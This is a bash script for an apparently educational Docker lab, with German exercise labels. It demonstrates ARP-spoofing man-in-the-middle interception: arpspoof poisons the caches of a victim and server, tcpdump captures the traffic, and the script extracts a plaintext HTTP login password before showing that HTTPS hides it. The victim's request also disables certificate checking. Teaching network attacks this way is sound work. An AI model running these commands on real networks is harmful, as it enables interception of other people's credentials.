#!/bin/bash
set -e
docker build -f Dockerfile.attacker -t ws-mitm-attacker .
docker network create --subnet 192.168.80.0/24 ws-mitm-net 2>/dev/null || true
docker run -d --rm --name mitm-server  --network ws-mitm-net --ip 192.168.80.10 -v "$PWD":/srv -w /srv python:3.11-slim python loginserver.py
docker run -d --rm --name mitm-victim  --network ws-mitm-net --ip 192.168.80.20 --cap-add=NET_ADMIN python:3.11-slim sleep infinity
docker run -d --rm --name mitm-attacker --network ws-mitm-net --ip 192.168.80.66 --cap-add=NET_ADMIN --cap-add=NET_RAW ws-mitm-attacker
sleep 3

echo "### Aufgabe 3: ARP-Spoofing + HTTP-Login mitlesen ###"
docker exec -d mitm-attacker sh -c "arpspoof -i eth0 -t 192.168.80.20 192.168.80.10 >/dev/null 2>&1"
docker exec -d mitm-attacker sh -c "arpspoof -i eth0 -t 192.168.80.10 192.168.80.20 >/dev/null 2>&1"
sleep 4
echo "victim ARP-Eintrag fuer Server zeigt jetzt die Angreifer-MAC:"
docker exec mitm-victim sh -c "ping -c1 192.168.80.10 >/dev/null 2>&1; grep 192.168.80.10 /proc/net/arp"
docker exec -d mitm-attacker sh -c "tcpdump -i eth0 -A -s0 'tcp port 80 and host 192.168.80.20' -w /tmp/mitm.pcap >/dev/null 2>&1"
sleep 2
docker exec mitm-victim python -c "import urllib.request,urllib.parse;d=urllib.parse.urlencode({'user':'alice','password':'SuperGeheim123'}).encode();urllib.request.urlopen('http://192.168.80.10/login',data=d,timeout=5)"
sleep 2
docker exec mitm-attacker sh -c "pkill tcpdump; pkill arpspoof" || true
echo "Mitgeschnittenes Klartext-Passwort:"
docker exec mitm-attacker sh -c "tcpdump -nr /tmp/mitm.pcap -A 2>/dev/null | grep -a password= | head -1"

echo; echo "### Aufgabe 4: mit HTTPS ist das Passwort geschuetzt ###"
docker exec -d mitm-server python /srv/loginserver_tls.py
sleep 2
docker exec -d mitm-attacker sh -c "arpspoof -i eth0 -t 192.168.80.20 192.168.80.10 >/dev/null 2>&1"
docker exec -d mitm-attacker sh -c "arpspoof -i eth0 -t 192.168.80.10 192.168.80.20 >/dev/null 2>&1"
sleep 3
docker exec -d mitm-attacker sh -c "tcpdump -i eth0 -A -s0 'tcp port 443 and host 192.168.80.20' -w /tmp/mitm_tls.pcap >/dev/null 2>&1"
sleep 2
docker exec mitm-victim python -c "import ssl,urllib.request,urllib.parse;ctx=ssl._create_unverified_context();d=urllib.parse.urlencode({'user':'alice','password':'SuperGeheim123'}).encode();urllib.request.urlopen('https://192.168.80.10/login',data=d,context=ctx,timeout=5)"
sleep 2
docker exec mitm-attacker sh -c "pkill tcpdump; pkill arpspoof" || true
echo "Vorkommen von 'SuperGeheim' im TLS-Mitschnitt (0 = nicht lesbar):"
docker exec mitm-attacker sh -c "tcpdump -nr /tmp/mitm_tls.pcap -A 2>/dev/null | grep -ac SuperGeheim"

